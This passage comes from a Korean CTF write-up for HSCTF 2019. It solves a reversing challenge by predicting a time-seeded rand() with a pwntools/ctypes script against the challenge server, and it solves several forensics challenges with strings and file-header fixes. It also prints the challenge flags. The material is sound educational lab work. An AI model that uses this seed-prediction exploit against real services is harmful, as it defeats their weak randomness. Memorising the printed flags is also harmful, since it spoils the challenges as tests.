            # cmp 'generated license' and 'goal license'
            for a,b in zip(l[count:], goal[count:]):
                if a == b:
                    found = True
                    count += 1
                else:
                    break
            # if found let's findout next char
            if found:
                break
        flag += c
        print count,flag
{{< /highlight >}}

## [Tux Talk Show 2019](#index)
`#rand`
```diff
Tux Talk Show 2019
425
Written by: Tux

Tux Talk Show 2019. Yes, this is trash.

nc rev.hsctf.com 6767

6c3739cd202fcf3496f465db32ae7dd1  trash
```
rand() 함수는 난수를 발생하지만 값을 예측할 수 있다는 단점이 있다.
정해진 알고리즘에 따라 숫자가 생성되기 때문이다.
{{< highlight c "linenos=true" >}}
int __cdecl main(int argc, const char **argv, const char **envp)
{

[snip]

  int v18[6]; // [sp+30h] [bp-260h]@1

[snip]

  std::basic_ifstream<char,std::char_traits<char>>::basic_ifstream(&v20, "flag.txt", 8LL);
  v3 = time(0LL);
  srand(v3);
  LODWORD(v4) = std::operator<<<std::char_traits<char>>(&std::cout, "Welcome to Tux Talk Show 2019!!!");
  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>(&std::cout, "Enter your lucky number: ");
  std::istream::operator>>(&std::cin, &v8);
  
[snip]

  v18[0] = 121;
  v18[1] = 1231231;
  v18[2] = 20312312;
  v18[3] = 122342342;
  v18[4] = 90988878;
  v18[5] = -30;
  for ( i = 0; i <= 5; ++i )
    v18[i] -= rand() % 10 - 1;
  v10 = 0;
  for ( j = 0; j <= 5; ++j )
    v10 += v18[j];
  if ( v10 == v8 )
  {
    // Congratz!! flag is hsctf{n1ce_j0b_w4th_r4ndom_gue33ing}
  }

[snip]
{{< / highlight >}}

입력한 숫자 v8이 연산 값 v10과 같아야지 flag.txt를 얻을 수 있다.
연산 값 v10은 다음과 같이 생성된다.

1. 현재 시간을 seed로 받아 rand() 값을 준비한다. (line 11-12)
2. v18 테이블을 초기 세팅한다. (line 20-25)
3. rand() 값으로 v18 테이블을 변형시킨다. (line 26-27)
4. v18 테이블을 전부 합한 값이 v10 이다. (line 29-30)

파이썬에서 ctypes 모듈을 사용했다.

{{< highlight python "linenos=true" >}}
from pwn import *
import ctypes
import time

t = int(time.time())
r = remote('rev.hsctf.com', 6767)
c = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
c.srand(t)
v18 = [121, 1231231, 20312312, 122342342, 90988878, -30]
for i in range(len(v18)):
    v18[i] = ctypes.c_int(v18[i] - c.rand() % 10 + 1).value

r.sendlineafter(': ', str(ctypes.c_int(sum(v18)).value))

r.interactive()
{{< /highlight >}}

로컬과 문제 서버의 시간차가 있을 수 있으므로 여러 번 시도하면 된다.

flag : `hsctf{n1ce_j0b_w4th_r4ndom_gue33ing}`

# [Forensics](#index)
## [Chicken Crossing](#index)
```diff
Chicken Crossing
56
Written by: Jeremy Hui

Keith is watching chickens cross a road in his grandfather’s farm. He once heard from his grandfather that there was something significant about this behavior, but he can’t figure out why. Help Keith discover what the chickens are doing from this seemingly simple behavior.

e5ab45d033b4075f365883362a616ac9  hsctf-chicken_crossing.jpg
```
jpg 파일을 제공해주는데 strings를 이용해서 문자열을 확인해보면 flag가 나온다.
```shell
# strings hsctf-chicken_crossing.jpg | grep hs
hsctf{2_get_2_the_other_side}
```
## [Cool Image](#index)
```diff
Cool Image
102
Forensics cppio
Written by: cppio

My friend told me he found a really cool image, but I couldn't open it. Can you help me access the image?

bda351d76be020420afa099dcea54b84  cool.pdf
```
친구가 내게 정말 멋진 이미지를 찾았다고 했는데 열리지가 않는다. 이 이미지에 접근할 수 있게 도와줄 수 있겠니?

문제 지문을 읽었다면 이상한 낌새를 눈치채야 한다.
지문에서 `이미지`라고 했는데 `cool.pdf` pdf 파일을 줬다.
물론 pdf에도 이미지가 있을 순 있긴 하다.

```shell
# file cool.pdf
cool.pdf: PNG image data, 1326 x 89, 8-bit/color RGBA, non-interlaced
```

file 명령어로 알아보니 PNG 파일이었다.
cool.png로 변경 후 열어보면 flag가 있다.

flag : `hsctf{who_uses_extensions_anyways}`
## [Cool Image 2](#index)
이번에는 cool.png 를 준다.
strings 로 푸는것도 아닌거같고 footer도 정상이다.
그렇다면 header를 확인해보니
```markup
I found this cool file. Its really cool!
<89>PNG^M
^Z
^@^@^@^MIHDR^@^@^D¶^@^@^@Y^H^F^@^@^@#;­Ñ^@^@^@^DgAMA^@^@±<8f>^Küa^E^@^@^@^FbKGD^@ÿ^@ÿ^@ÿ ½§<93>^@^@^@   pHYs^@^@^K^S^@^@^K^S^A^@<9a><9c>^X^@^@^@^GtIME^Gã^E^_^O^K^V<80>â <92>^@^@ ^@IDATxÚì]ex^TW^W~ïÌ
```
맨 위의 I found this cool file. Its really cool! 을 지우고 파일을 열면 flag가 보인다.

flag : `hsctf{sorry_about_the_extra_bytes}`
## [Slap](#index)
strings 로 풀었다.
```shell
# strings slap.jpg | egrep -o hsctf{.*}
hsctf{twoslapsnonetforce}
hsctf{twoslapsnonetforce}
```

flag : `hsctf{twoslapsnonetforce}`
